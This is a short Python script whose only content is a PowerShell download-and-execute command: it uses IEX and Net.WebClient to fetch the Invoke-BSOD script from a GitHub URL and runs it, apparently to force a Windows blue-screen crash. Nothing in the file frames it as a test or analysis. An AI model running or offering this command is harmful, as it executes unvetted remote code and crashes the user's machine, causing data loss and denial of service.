import subprocess

powershell_command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"

result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)